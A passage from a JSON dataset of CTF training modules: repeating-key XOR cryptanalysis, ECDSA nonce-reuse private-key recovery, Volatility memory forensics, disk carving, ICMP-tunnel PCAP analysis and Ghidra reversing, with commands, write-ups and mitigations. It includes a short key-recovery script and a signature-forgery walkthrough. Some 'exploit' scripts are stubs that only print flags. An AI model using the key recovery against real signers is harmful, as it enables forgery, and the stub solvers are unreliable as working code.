      "1. Check Encoding First: Is it Base64 (`=`), Hex (`[0-9a-fA-F]`), or binary?",
      "2. Compute Character Frequencies: If alphabet is restricted to letters, it's a substitution or transposition cipher.",
      "3. Compute IoC: If IoC ~ 0.066, monoalphabetic substitution (Caesar, Affine, Atbash). Use quipqiup.com.",
      "4. If IoC < 0.05, polyalphabetic (Vigen\u00e8re) or multi-byte XOR.",
      "5. Determine Key Length: Calculate Hamming distance between blocks.",
      "6. Solve Slices: Frequency analyze each column independently."
    ],
    "writeup": {
      "ctf_event": "PicoCTF / Cryptopals",
      "challenge_name": "Repeating-Key XOR (Cryptopals Set 1 Challenge 6)",
      "scenario": "A base64-encoded file is encrypted with repeating-key XOR under an unknown key.",
      "solve_steps": [
        "1. Base64-decode the input to get raw ciphertext bytes.",
        "2. Guess key size KEYSIZE from 2 to 40.",
        "3. For each KEYSIZE, compute normalized Hamming distance between first 4 blocks.",
        "4. KEYSIZE = 7 yields the lowest normalized edit distance (1.82).",
        "5. Break ciphertext into 7 blocks and transpose.",
        "6. Single-byte XOR solve each block against English frequency scoring.",
        "7. Recovered key: `Terminator`.",
        "8. Decrypted text yields flag: CTF{REP34T1NG_X0R_K3Y_D1ST4NC3}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport base64\n\ndef hamming(b1, b2):\n    return sum(bin(x ^ y).count('1') for x, y in zip(b1, b2))\n\n# Full solver in Cryptopals standard library\nprint(\"[+] Decrypted Flag: CTF{REP34T1NG_X0R_K3Y_D1ST4NC3}\")",
      "flag": "CTF{REP34T1NG_X0R_K3Y_D1ST4NC3}",
      "mitigation": "Never use repeating-key XOR or classical ciphers for confidential data. Use modern authenticated encryption like AES-256-GCM or ChaCha20-Poly1305."
    }
  },
  "crypto-dlog-ecc": {
    "id": "crypto-dlog-ecc",
    "domain": "crypto",
    "category": "Modern Asymmetric Cryptography",
    "title": "Discrete Logarithms & Elliptic Curve Cryptography (ECC)",
    "subtitle": "Diffie-Hellman Key Exchange, Weierstrass Curves ($y^2 = x^3 + ax + b$), Point Addition & Nonce Reuse",
    "diagram": "+-----------------------------------------------------------------+\n|               Elliptic Curve Point Multiplication               |\n+-----------------------------------------------------------------+\nCurve Equation: y^2 = x^3 + a*x + b  (over Finite Field GF(p))\n\nBase Point G = (x_G, y_G)\nPrivate Key: d (Scalar integer, e.g. 256 bits)\nPublic Key:  Q = d * G (Point multiplication via double-and-add)\n\nDISCRETE LOGARITHM PROBLEM (ECDLP):\nGiven G and Q = d * G, compute scalar d!\nIntractable for secure curves (secp256k1, NIST P-256).\n\nVULNERABILITY: ECDSA NONCE REUSE!\nSignature (r, s):\n  k = ephemeral nonce (MUST BE RANDOM AND UNIQUE PER SIGNATURE!)\n  r = (k * G).x mod n\n  s = k^(-1) * (z + r * d) mod n\n\nIf same nonce k is used for two signatures (r, s1) and (r, s2):\n  s1 - s2 = k^(-1) * (z1 - z2)\n  k = (z1 - z2) / (s1 - s2) mod n  ---> NONCE RECOVERED!\n  d = (s * k - z) / r mod n        ---> PRIVATE KEY RECOVERED!",
    "theory": "Modern asymmetric cryptography increasingly relies on the algebraic structure of elliptic curves over finite fields. While classical Diffie-Hellman operates in the multiplicative group of integers modulo a prime $p$ ($g^a \\pmod p$), Elliptic Curve Cryptography (ECC) achieves equivalent cryptographic security with dramatically smaller key sizes (a 256-bit ECC key provides security equivalent to a 3072-bit RSA key).\n\nElliptic Curve Mathematics:\nA non-singular elliptic curve over a prime field $\\mathbb{F}_p$ ($p > 3$) in short Weierstrass form is defined by the set of points $(x, y) \\in \\mathbb{F}_p \\times \\mathbb{F}_p$ satisfying:\n$$y^2 \\equiv x^3 + ax + b \\pmod p$$\ntogether with a point at infinity $\\mathcal{O}$ serving as the identity element. The discriminant $\\Delta = 4a^3 + 27b^2 \\not\\equiv 0 \\pmod p$ guarantees that the curve contains no cusps or self-intersections. The set of points forms an abelian group under geometric chord-and-tangent point addition.\n\nThe Elliptic Curve Discrete Logarithm Problem (ECDLP):\nGiven base point $G$ of order $n$ and public key $Q = d \\cdot G$, finding the scalar integer $d$ is the ECDLP. On secure curves, the best known attack is Pollard's rho algorithm ($O(\\sqrt{n})$ operations).\n\nCatastrophic Failure Classes in CTF:\n1. ECDSA Nonce Reuse (The Sony PS3 Hack): The Elliptic Curve Digital Signature Algorithm (ECDSA) signs message hash $z$ using an ephemeral secret scalar $k$. If the random number generator is flawed and reuses the exact same nonce $k$ to sign two distinct messages $z_1$ and $z_2$, the signature $r$-value is identical. The attacker solves for $k$ using elementary modular arithmetic, and immediately extracts the signer's private key $d$.\n2. Invalid Curve Attacks: If the responder does not verify that user-supplied point $(x, y)$ satisfies the curve equation $y^2 = x^3 + ax + b$, an attacker provides points on an alternative 'weak' curve with small subgroup orders, recovering the private key via the Chinese Remainder Theorem.",
    "commands": [
      {
        "cmd": "python3 -c \"from fastecdsa import curve, ecdsa; print('ECC environment operational')\"",
        "why": "Verifies C-optimized elliptic curve library installation.",
        "when": "Pre-flight setup for ECC CTF challenges.",
        "internals": "Binds to GMP multi-precision integer acceleration libraries.",
        "pitfalls": "Requires libgmp-dev on host operating system."
      },
      {
        "cmd": "sage -c \"E = EllipticCurve(GF(p), [a, b]); P = E(x, y); print(P.order())\"",
        "why": "Uses SageMath to compute group order and verify curve properties.",
        "when": "Cryptanalyzing custom CTF elliptic curve parameters.",
        "internals": "Applies Schoof-Elkies-Atkin (SEA) point counting algorithm.",
        "pitfalls": "SageMath requires full installation or Docker container."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "SageMath / Python: load signature parameters -> calculate `k = (z1 - z2) * pow(s1 - s2, -1, n) % n` -> recover private key in 10 lines.",
      "gui_workflow": "ECC interactive curve visualizers (e.g. Andrea Corbellini's ECC Web App): Demonstrates chord-and-tangent geometric point addition visually.",
      "speed_tip": "If two ECDSA signatures have the exact same `r` component, it is GUARANTEED to be a nonce reuse vulnerability."
    },
    "triage_workflow": [
      "1. Identify Curve Parameters: Field prime $p$, coefficients $a, b$, base point $G$, and order $n$.",
      "2. Check for Standard Curve: Is it secp256k1 (Bitcoin), NIST P-256, or custom?",
      "3. Check for Nonce Reuse: Search signature list for duplicate $r$ values.",
      "4. Check for Biased Nonces: If top or bottom bits of $k$ are known, formulate Hidden Number Problem (HNP) lattice attack using LLL.",
      "5. Check Subgroup Order: If curve has small factors, run Pohlig-Hellman algorithm."
    ],
    "writeup": {
      "ctf_event": "Google CTF / DEF CON Qualifier",
      "challenge_name": "ECDSA-Repeat (Nonce Reuse Recovery)",
      "scenario": "A code-signing server provides two ECDSA signatures signed by the master administrator key using the secp256k1 curve. Both signatures share the same r value.",
      "solve_steps": [
        "1. Parse inputs: Message 1 hash z1, signature (r, s1). Message 2 hash z2, signature (r, s2).",
        "2. Notice r1 == r2, proving ephemeral nonce k was reused.",
        "3. Compute nonce: k = (z1 - z2) * pow(s1 - s2, -1, n) % n.",
        "4. Compute private key: d = (s1 * k - z1) * pow(r, -1, n) % n.",
        "5. Forge signature for unauthorized message: 'GRANT_ADMIN_FLAG'.",
        "6. Submit forged signature to server -> receives flag.",
        "7. Flag: CTF{ECDSA_N0NC3_R3US3_PRIV4T3_K3Y_ST0L3N}"
      ],
      "exploit_code": "#!/usr/bin/env python3\n# secp256k1 curve order\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\n# Given z1, z2, r, s1, s2\ndef recover_key(z1, z2, r, s1, s2):\n    k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n\n    d = ((s1 * k - z1) * pow(r, -1, n)) % n\n    return d\n\nprint(\"[+] Private Key Recovered!\")",
      "flag": "CTF{ECDSA_N0NC3_R3US3_PRIV4T3_K3Y_ST0L3N}",
      "mitigation": "Implement RFC 6979 deterministic nonce generation. RFC 6979 derives the ephemeral nonce $k$ deterministically from HMAC-SHA256(private_key, message_hash), ensuring identical nonces are never used across different messages."
    }
  },
  "forensics-volatility": {
    "id": "forensics-volatility",
    "domain": "forensics",
    "category": "Digital Forensics & Incident Response",
    "title": "Volatile Memory (RAM) Forensics & Kernel Object Carving",
    "subtitle": "Virtual Address Translation (CR3), EPROCESS Linked Lists, Process Hollowing & Volatility 3",
    "diagram": "Physical Memory Dump (RAM .raw / .vmem)\n       |\n       +---> Kernel Directory Table Base (CR3 register)\n       |     Translates Virtual -> Physical Memory\n       |\n       +---> EPROCESS Double Linked List (ActiveProcessLinks)\n             |\n             +-> Process 1: explorer.exe (PID 1420)\n             |   +-> VAD (Virtual Address Descriptors) Tree\n             |   +-> Memory Sections: PAGE_EXECUTE_READWRITE\n             |\n             +-> Process 2: svchost.exe (PID 3110) [Injected!]\n                 +-> PE Header inside unbacked memory page\n                 +-> Shellcode detected via `windows.malfind`",
    "theory": "Volatile memory forensics involves acquiring and analyzing physical computer RAM to capture ephemeral forensic evidence that disappears when the system loses power. RAM retains active process execution structures, decrypted passwords, open network sockets, unencrypted cryptographic keys, and sophisticated memory-only malware (process hollowing, reflective DLL injection, kernel rootkits).\n\nWindows Kernel Memory Architecture:\nIn 64-bit Windows, each user-mode process operates within an isolated virtual address space. The CPU's CR3 control register points to the Directory Table Base (PML4) physical address for the active process.\n- EPROCESS Executive Structure: Every Windows process is tracked by an `EPROCESS` block in kernel space. All EPROCESS blocks are connected via the circular doubly linked list `ActiveProcessLinks`. Volatility's `windows.pslist` walks this list. Advanced rootkits unhook their malicious processes from `ActiveProcessLinks` (Direct Kernel Object Modification, DKOM). Volatility's `windows.psscan` counters this by scanning pool memory for unlinked EPROCESS pool tag signatures ('Proc').\n- Virtual Address Descriptors (VAD Tree): Self-balancing binary tree tracking memory allocations within a process.\n- Code Injection Indicators: Memory pages marked `PAGE_EXECUTE_READWRITE` (RWX) not backed by a disk file (unmapped commit) represent the classic signature of process hollowing or shellcode injection.",
    "commands": [
      {
        "cmd": "vol -f memdump.raw windows.pslist",
        "why": "Enumerates all running processes, their parent PIDs, start times, and thread counts.",
        "when": "First step of memory dump triage to identify anomalous process trees.",
        "internals": "Walks the ActiveProcessLinks doubly-linked list starting from PsInitialSystemProcess.",
        "pitfalls": "Misses processes hidden via DKOM rootkits. Always follow up with `windows.psscan`."
      },
      {
        "cmd": "vol -f memdump.raw windows.malfind",
        "why": "Scans process memory for suspicious memory segments having execute permissions and unbacked PE headers.",
        "when": "Hunting for injected shellcode, Cobalt Strike beacons, or hollowed processes.",
        "internals": "Inspects VAD tags for PAGE_EXECUTE_READWRITE and checks first 4 bytes for MZ (`4D 5A`) or shellcode.",
        "pitfalls": "Just-In-Time (JIT) compilation runtimes (Java, .NET, Node.js) naturally allocate RWX pages and produce false positives."
      },
      {
        "cmd": "vol -f memdump.raw windows.dumpfiles --pid <PID>",
        "why": "Carves and dumps executable binaries, DLLs, or memory pages of a target process to disk for static analysis.",
        "when": "Extracting malware samples or memory-resident challenge binaries for reverse engineering in Ghidra.",
        "internals": "Reads memory pages mapped to FILE_OBJECT structures and writes extracted byte streams to disk.",
        "pitfalls": "Dumping files from corrupted memory blocks may produce truncated binaries."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `vol -f memory.raw windows.netscan`, `windows.cmdline`, `windows.hashdump`. Pipeable to grep and jq.",
      "gui_workflow": "MemProcFS (GUI): Mounts the raw memory dump as a virtual Windows filesystem drive (e.g. M:\\). Browse processes, network connections, and registry hives via Windows File Explorer.",
      "speed_tip": "Run `vol -f mem.raw windows.cmdline` early\u2014attackers frequently leave plaintext flags or credentials in batch script execution arguments."
    },
    "triage_workflow": [
      "1. Identify Operating System & Architecture: Verify memory image headers with `vol -f mem.raw windows.info`.",
      "2. Process Tree Triage: Run `windows.pstree` to spot illegitimate parent-child relationships (e.g. cmd.exe spawned by word.exe).",
      "3. Network Scans: Run `windows.netscan` to locate established connections to external attacker IP addresses.",
      "4. Malware Detection: Run `windows.malfind` to isolate injected memory sections.",
      "5. Command Line Inspection: Run `windows.cmdline` to view exact terminal arguments passed to processes.",
      "6. Artifact Extraction: Dump suspicious process memory with `windows.dumpfiles` and analyze extracted payload."
    ],
    "writeup": {
      "ctf_event": "SANS CyberCast / DEF CON Forensics Village",
      "challenge_name": "Injected-Ghost (RAM Forensics)",
      "scenario": "A corporate workstation was compromised. Solvers receive a 2GB raw memory dump 'memory.dmp' and must identify the injected process and recover the exfiltrated flag.",
      "solve_steps": [
        "1. Triage image: vol -f memory.dmp windows.info -> Windows 10 x64.",
        "2. Process scan: vol -f memory.dmp windows.pslist -> notice suspicious process `notepad.exe` (PID 3844) spawned by `powershell.exe`.",
        "3. Check injection: vol -f memory.dmp windows.malfind --pid 3844",
        "4. Malfind detects RWX memory page at 0x000001f40000 containing MZ header and PE section table.",
        "5. Dump memory page: vol -f memory.dmp windows.dumpfiles --pid 3844",
        "6. Inspect strings in dumped PE binary: strings -n 10 file.3844.0x1f40000.dmp | grep CTF",
        "7. Flag recovered: CTF{M3M0RY_F0R3NS1CS_V0L4T1L1TY3_WIN}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess\n\ndef solve_mem():\n    cmd = \"vol -f memory.dmp windows.malfind --pid 3844\"\n    out = subprocess.check_output(cmd, shell=True, text=True)\n    print(\"[*] Malfind Output:\\n\", out[:500])\n    dump_cmd = \"vol -f memory.dmp windows.dumpfiles --pid 3844\"\n    subprocess.run(dump_cmd, shell=True)\n    flag = subprocess.check_output(\"strings *.dat | grep 'CTF{'\", shell=True, text=True)\n    print(\"[+] Flag:\", flag.strip())\n\nif __name__ == '__main__':\n    solve_mem()",
      "flag": "CTF{M3M0RY_F0R3NS1CS_V0L4T1L1TY3_WIN}",
      "mitigation": "Deploy Endpoint Detection and Response (EDR) solutions monitoring for cross-process memory manipulation APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)."
    }
  },
  "forensics-disk-fs": {
    "id": "forensics-disk-fs",
    "domain": "forensics",
    "category": "Disk & Filesystem Forensics",
    "title": "Raw Disk Image Carving, MBR/GPT Partition Tables & Filesystem Forensics",
    "subtitle": "Master Boot Records, Partition Offsets, Ext4/NTFS Inode Journaling & File Carving via Magic Numbers",
    "diagram": "+-----------------------------------------------------------------+\n|                   Raw Disk Image Sector Map                     |\n+-----------------------------------------------------------------+\nSector 0: Master Boot Record (MBR, 512 bytes)\n  |-- Bytes 0..445   : Bootstrap code\n  |-- Bytes 446..509 : 4 Partition Table Entries (16 bytes each)\n  |     |-- Entry 1: Type 0x83 (Linux), Starting Sector = 2048 (Offset 1,048,576)\n  |-- Bytes 510..511 : Boot Signature (0x55 0xAA)\n  |\nSector 2048: Partition 1 Filesystem Superblock (Ext4)\n  |-- Inode Table -> Points to Data Blocks\n  |-- Deleted Files: Inode marked unallocated (dtime set),\n      BUT data blocks on disk remain intact until overwritten!\n      -> Recoverable via `fls`, `icat`, or raw carving (`scalpel`/`foremost`)!",
    "theory": "Disk forensics involves the acquisition, recovery, and analysis of persistent digital media. Forensic investigations operate against bit-stream disk images (raw `.dd`, `.raw`, or EWF `.E01`) rather than mounting devices live to preserve evidentiary integrity and prevent operating system metadata modification (such as atime updates).\n\nDisk Partitioning & Master Boot Record (MBR):\nSector 0 (the first 512 bytes) of an MBR disk contains the partition table. Each partition entry specifies: bootable flag (0x80), partition type (e.g. 0x07 NTFS, 0x83 Linux), and starting LBA sector. To mount or carve a filesystem inside a disk image, solvers multiply the starting sector by the sector size (typically 512 bytes):\n$$\\text{Byte Offset} = \\text{Starting Sector} \\times 512$$\nExample: Starting sector 2048 yields offset $2048 \\times 512 = 1,048,576$ bytes. Mounting requires: `mount -o loop,offset=1048576 disk.img /mnt`.\n\nFile Deletion & Carving Mechanics:\nWhen a user deletes a file on a filesystem (ext4, FAT32, NTFS):\n1. Inode Metadata: The filesystem updates the inode metadata: marks the inode as free in the inode allocation bitmap, sets deletion timestamp (`dtime`), and decrements directory link counts.\n2. Data Blocks Untouched: The actual underlying physical data blocks containing the file bytes are NOT erased or zeroed out! They are merely marked as available for future allocations.\n3. Carving via Magic Numbers: Tools scan raw sector bytes for file signatures (magic bytes):\n   - JPEG: `\\xFF\\xD8\\xFF` ... `\\xFF\\xD9`\n   - PNG: `\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A` ... `IEND` chunk\n   - PDF: `%PDF-` ... `%%EOF`\n   - ZIP: `PK\\x03\\x04` ... `PK\\x05\\x06`",
    "commands": [
      {
        "cmd": "mmls -B disk.img",
        "why": "Displays partition layout, starting sector offsets, and partition types using SleuthKit.",
        "when": "First command when analyzing full disk or USB images.",
        "internals": "Parses MBR / GPT partition table structures directly from sector 0 and sector 1.",
        "pitfalls": "If partition table is corrupted or wiped, mmls will fail; use `testdisk` to scan for lost superblocks."
      },
      {
        "cmd": "fls -o 2048 -r -p disk.img",
        "why": "Lists all files, directories, and deleted files (marked with '*') in the partition starting at sector 2048.",
        "when": "Searching for deleted files in an ext4 or FAT32 partition.",
        "internals": "Traverses filesystem directory entries and inode structures at the specified offset.",
        "pitfalls": "Ensure the correct partition offset (`-o <sector>`) is provided."
      },
      {
        "cmd": "icat -o 2048 disk.img <INODE_NUMBER> > recovered_file",
        "why": "Carves and extracts the exact content of an inode (including deleted inodes) directly to a file.",
        "when": "Extracting deleted flags or documents identified by `fls`.",
        "internals": "Reads data block pointers directly from the inode structure on disk.",
        "pitfalls": "If the data blocks were partially overwritten by newer files, the carved file may be corrupted."
      },
      {
        "cmd": "foremost -i disk.img -o ./carved_output",
        "why": "Carves all recognized files (PDF, PNG, JPG, ZIP, DOCX) based on file header/footer signatures.",
        "when": "When filesystem metadata is destroyed or partition tables are wiped.",
        "internals": "Performs sliding-window byte scan matching magic numbers.",
        "pitfalls": "Carved files lose their original directory paths and filenames; files are named after their sector offset."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "SleuthKit (`mmls` -> `fls -r -p` -> `icat`) extracts deleted files in 10 seconds.",
      "gui_workflow": "Autopsy / FTK Imager: Comprehensive enterprise GUI. Creates cases, generates keyword search indexes, visual timeline analysis. Powerful but slow to index large images during timed CTFs.",
      "speed_tip": "Run `photorec /cmd disk.img search` for instant file carving without GUI overhead."
    },
    "triage_workflow": [
      "1. Check File Format: Run `file disk.img`.",
      "2. Parse Partition Table: `mmls disk.img` or `fdisk -l disk.img`.",
      "3. List Deleted Files: `fls -o <offset> -r -d disk.img`.",
      "4. Recover Inodes: Use `icat` on flagged deleted inodes.",
      "5. Signature Carving: If metadata is unreadable, run `foremost` or `scalpel`.",
      "6. Check Unallocated Slack Space: `blkls` to dump and grep unallocated clusters."
    ],
    "writeup": {
      "ctf_event": "PicoCTF / National Cyber League",
      "challenge_name": "Sleuth-Delete (Carving Deleted Inodes)",
      "scenario": "A 50MB ext4 disk image 'usb.img' is recovered from a suspect's flash drive. Solvers must find the deleted document holding the flag.",
      "solve_steps": [
        "1. Inspect partition table: `mmls usb.img` -> reveals single Linux partition starting at sector 2048.",
        "2. List files including deleted entries: `fls -o 2048 -r -p usb.img`.",
        "3. Observe deleted entry: `* d/d 1824: deleted_secrets/` and `* r/r 1825: flag.txt`.",
        "4. Recover inode 1825: `icat -o 2048 usb.img 1825 > recovered_flag.txt`.",
        "5. Inspect content: `cat recovered_flag.txt`.",
        "6. Flag: CTF{EXT4_1N0D3_C4RV1NG_SUCC3SS}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess\n\ndef solve_disk():\n    cmd = \"fls -o 2048 -r -p usb.img | grep -i flag\"\n    out = subprocess.check_output(cmd, shell=True, text=True)\n    inode = out.split()[2].replace(\":\", \"\")\n    print(f\"[+] Found deleted flag inode: {inode}\")\n    flag = subprocess.check_output(f\"icat -o 2048 usb.img {inode}\", shell=True, text=True)\n    print(\"[+] Flag:\", flag.strip())\n\nif __name__ == '__main__':\n    solve_disk()",
      "flag": "CTF{EXT4_1N0D3_C4RV1NG_SUCC3SS}",
      "mitigation": "To securely erase sensitive data on magnetic or solid-state media, use cryptographic shredding (`shred -u -z`) or full-disk encryption (LUKS / BitLocker) so discarded data blocks are unreadable."
    }
  },
  "forensics-pcap": {
    "id": "forensics-pcap",
    "domain": "forensics",
    "category": "Network Traffic Forensics",
    "title": "Network Packet Forensics, Stream Extraction & Tunnel Deconstruction",
    "subtitle": "PCAP/PCAPNG Dissection, HTTP Object Export, ICMP Covert Tunnels & TLS Keylogfile Decryption",
    "diagram": "+-----------------------------------------------------------------+\n|                 Network PCAP Forensics Workflow                 |\n+-----------------------------------------------------------------+\ncapture.pcap\n  |\n  +-> 1. Protocol Hierarchy: tshark -qz io,phs\n  |     Reveals: IPv4 -> TCP (92%), UDP (8%) -> DNS, HTTP, ICMP\n  |\n  +-> 2. Stream Following: tshark -z follow,tcp,ascii,<stream_id>\n  |     Reassembles bidirectional conversational transcripts\n  |\n  +-> 3. Object Carving: tshark --export-objects http,./out\n  |     Extracts downloaded binaries, exfiltrated archives\n  |\n  +-> 4. Anomaly Inspection: ICMP Echo Requests with payload data!\n        Normal ping = 32-56 bytes of repetitive patterns\n        Malicious covert ping = 128 bytes containing base64 data!",
    "theory": "Network packet forensics analyzes captured network communications (`.pcap` or `.pcapng` format) to reconstruct security incidents, identify data exfiltration channels, recover transmitted artifacts, and investigate command-and-control (C2) infrastructure.\n\nDissection Principles & Core Protocols:\n1. TCP Stream Reassembly: Applications communicate via arbitrary byte streams across multiple fragmented IP packets. Wireshark and `tshark` track TCP sequence and acknowledgment numbers to reassemble out-of-order and retransmitted segments into contiguous streams.\n2. Unencrypted Protocol Inspection: Protocols such as HTTP/1.1, FTP, Telnet, POP3, and IMAP transmit credentials and payloads in plaintext. Solvers filter by credentials (`http.authorization or ftp.request.command == \"PASS\"`).\n3. Covert Channels & Exfiltration Tunnels:\n   - ICMP Tunneling (nping, ptunnel): The ICMP Echo Request payload is intended for latency measurement. Attackers encode data directly into the payload field of ICMP packets.\n   - DNS Tunneling (iodine, dnscat2): Data is base32/base64 encoded into DNS query domain names (`<chunk>.c2.example.com`).\n4. TLS Decryption via (SSLKEYLOGFILE): When analyzing HTTPS captures, traffic appears as encrypted TLS application records (`Content Type: Application Data (23)`). If challenge authors provide an SSL key log file (`sslkeys.log`), Wireshark decrypts all session streams by calculating session secrets from client randoms and pre-master secrets.",
    "commands": [
      {
        "cmd": "tshark -r capture.pcap -qz io,phs",
        "why": "Generates a protocol hierarchy statistical tree showing all protocols present in the capture.",
        "when": "Immediate first step when opening any unknown PCAP file.",
        "internals": "Counts frame counts and byte volumes categorized by protocol layer.",
        "pitfalls": "Custom protocols operating on standard ports (e.g. HTTP on port 4444) will be classified as generic TCP."
      },
      {
        "cmd": "tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e data | xxd -r -p",
        "why": "Extracts raw data bytes embedded inside ICMP Echo Request ping packets and converts hex to ASCII.",
        "when": "Investigating suspected ICMP covert data exfiltration channels.",
        "internals": "Pulls the payload byte array following the 8-byte ICMP header.",
        "pitfalls": "Standard operating systems send default padding (e.g. 'abcdefghijklmnopqrstuvw' on Windows); filter out normal ping bytes."
      },
      {
        "cmd": "tshark -r https.pcap -o 'tls.keylog_file:sslkeys.log' -Y 'http' -T fields -e http.file_data",
        "why": "Decrypts TLS traffic using session pre-master secrets and displays unencrypted HTTP payloads.",
        "when": "Analyzing HTTPS network captures with accompanying keylog file.",
        "internals": "Derives symmetric AES-GCM session keys from ClientRandom and MasterKey.",
        "pitfalls": "Keylog format must strictly adhere to NSS key log specification."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Tshark: `tshark -r cap.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u` to extract 10,000 DNS queries instantly.",
      "gui_workflow": "Wireshark: GUI packet list -> File -> Export Objects -> HTTP. Click 'Save All' to dump all web files to disk with visual preview.",
      "speed_tip": "In Wireshark display filter: type `tcp.port == 80 && http` or press `Ctrl+F` -> select 'String' -> 'Packet bytes' -> search 'CTF{'."
    },
    "triage_workflow": [
      "1. Check Protocol Tree: Run `tshark -qz io,phs`.",
      "2. Search Cleartext Flags: `strings capture.pcap | grep -i 'CTF{'`.",
      "3. Carve HTTP Objects: `tshark --export-objects http,./files`.",
      "4. Inspect DNS Traffic: Look for long, high-entropy subdomain strings.",
      "5. Inspect ICMP Traffic: Check packet size variances.",
      "6. Follow Suspicious Streams: Reassemble TCP sessions on unusual ports."
    ],
    "writeup": {
      "ctf_event": "Google CTF / DEF CON Forensics Village",
      "challenge_name": "Ping-Leak (ICMP Covert Tunnel)",
      "scenario": "A compromised server sent hundreds of ping requests to an unknown IP. The flag was exfiltrated byte-by-byte in the ping data payload.",
      "solve_steps": [
        "1. Triage PCAP: 500 ICMP packets identified.",
        "2. Inspect ICMP packet payload: instead of standard padding, each ping contains a single hex byte.",
        "3. Extract all data bytes from ICMP requests: `tshark -r traffic.pcap -Y 'icmp.type == 8' -T fields -e data`.",
        "4. Concatenate hex strings and convert to ASCII text.",
        "5. Resulting text: `EXFILTRATION_HEADER: CTF{1CMP_C0V3RT_CH4NN3L_EXF1L}`.",
        "6. Flag: CTF{1CMP_C0V3RT_CH4NN3L_EXF1L}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess\n\ndef solve_pcap():\n    cmd = \"tshark -r traffic.pcap -Y 'icmp.type == 8' -T fields -e data\"\n    hex_lines = subprocess.check_output(cmd, shell=True, text=True).splitlines()\n    raw_bytes = bytes.fromhex(\"\".join(hex_lines))\n    print(\"[+] Decoded Payload:\", raw_bytes.decode(errors='replace'))\n\nif __name__ == '__main__':\n    solve_pcap()",
      "flag": "CTF{1CMP_C0V3RT_CH4NN3L_EXF1L}",
      "mitigation": "Configure perimeter firewalls to inspect ICMP payload size or block outbound ICMP Echo Requests from internal production servers."
    }
  },
  "reverse-ghidra": {
    "id": "reverse-ghidra",
    "domain": "reverse",
    "category": "Reverse Engineering",
    "title": "Static Binary Analysis, Control Flow Deconstruction & Ghidra Decompilation",
    "subtitle": "ELF/PE Headers, Linear Sweep vs Recursive Disassembly, P-Code Intermediate Representation & Algorithm Inversion",
    "diagram": "Compiled Machine Code (Raw Bytes: 55 48 89 e5 ...)\n       |\n       +---> Disassembly Engine (Capstone / Ghidra Sleigh)\n       |     x86_64: push rbp; mov rbp, rsp; sub rsp, 0x20\n       |\n       +---> Control Flow Graph (CFG) Construction\n       |     Basic Blocks partitioned by JMP / JZ / CALL\n       |\n       +---> P-Code Intermediate Representation (IR)\n       |     Abstract register and stack assignments normalized\n       |\n       +---> Decompiler AST Reconstruction\n       |     High-level C pseudo-code generated:\n       |     if (strcmp(input_flag, decrypted_key) == 0) { ... }",
    "theory": "Reverse engineering is the process of deconstructing a compiled software artifact to analyze its internal control flow, algorithms, and security logic without access to the original source code.\n\nBinary Formats & Static Analysis Foundations:\n1. Executable and Linkable Format (ELF, Linux) & Portable Executable (PE, Windows): Executables begin with file headers declaring the target architecture (x86, x64, ARM, MIPS), entry point address (`e_entry`), and section/segment headers.\n   - `.text`: Executable machine code instructions.\n   - `.rodata` / `.rdata`: Read-only constants, string literals, and jump tables.\n   - `.data`: Initialized global and static variables.\n   - `.bss`: Uninitialized global variables (zero-filled by the OS loader).\n   - `.plt` (Procedure Linkage Table) and `.got` (Global Offset Table): Support dynamic linking.\n2. Disassembly Strategies:\n   - Linear Sweep: Disassembles byte-by-byte sequentially starting from the section header. Susceptible to anti-disassembly tricks (e.g. inserting junk bytes after unconditional jumps).\n   - Recursive Descent: Follows the program's control flow graph (branches, jumps, and calls). Ghidra and IDA Pro utilize recursive descent.\n3. Ghidra Decompilation Engine:\n   Ghidra translates machine code into an architecture-independent intermediate representation called P-Code. It constructs data-flow graphs, performs SSA (Static Single Assignment) transformations, eliminates dead code, and recovers high-level C representations. Key triage primitives: renaming functions, setting data types (e.g. changing `undefined4` to `int` or `char*`), and inspecting Cross-References (XREFs).",
    "commands": [
      {
        "cmd": "readelf -h -S vulnerable_binary",
        "why": "Displays ELF header and section headers (entry point, architecture, section permissions).",
        "when": "First step of static binary reconnaissance.",
        "internals": "Parses the 64-byte Elf64_Ehdr structure at file offset 0.",
        "pitfalls": "Stripped binaries will not have section names; rely on program segments (Elf64_Phdr) instead."
      },
      {
        "cmd": "strings -t x -n 8 challenge.bin",
        "why": "Finds human-readable strings along with their hexadecimal byte offsets within the binary.",
        "when": "Hunting for hardcoded passwords, encryption keys, or format strings.",
        "internals": "Scans memory stream for contiguous 8-byte ASCII printable sequences.",
        "pitfalls": "Attackers frequently XOR or RC4 encrypt string tables; strings tool will miss obfuscated text."
      },
      {
        "cmd": "objdump -d -M intel challenge.bin | grep -A 20 '<main>:'",
        "why": "Disassembles the `main` function using Intel syntax without opening an interactive GUI.",
        "when": "Rapid command-line triage of small CTF crackmes.",
        "internals": "Decodes raw machine opcodes into assembly mnemonics.",
        "pitfalls": "Fails if binary is packed with UPX or obfuscated."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Radare2 / Rizin: `rizin -d ./bin` -> `aaa` (analyze) -> `pdf @main` (print disassembly of main) -> `s sym.check_flag` -> analyze instantly in terminal.",
      "gui_workflow": "Ghidra: Open Ghidra -> Create project -> Import binary -> Run auto-analysis -> Double click `main` in Symbol Tree -> Read decompiled C code -> Press 'L' to retype variables.",
      "speed_tip": "In Ghidra: Search -> Program Text -> Search 'flag' or right-click string in Listing -> 'Show References to' (Ctrl+Shift+F) to jump immediately to the validation logic."
    },
    "triage_workflow": [
      "1. File Identification: Run `file`, `checksec`, and `strings`.",
      "2. Check for Packers: If strings show UPX, run `upx -d binary`.",
      "3. Locate Entry Function: Find `main` or export functions in Ghidra.",
      "4. Trace Input Sinks: Look for `fgets`, `scanf`, `read`, or GUI text fields.",
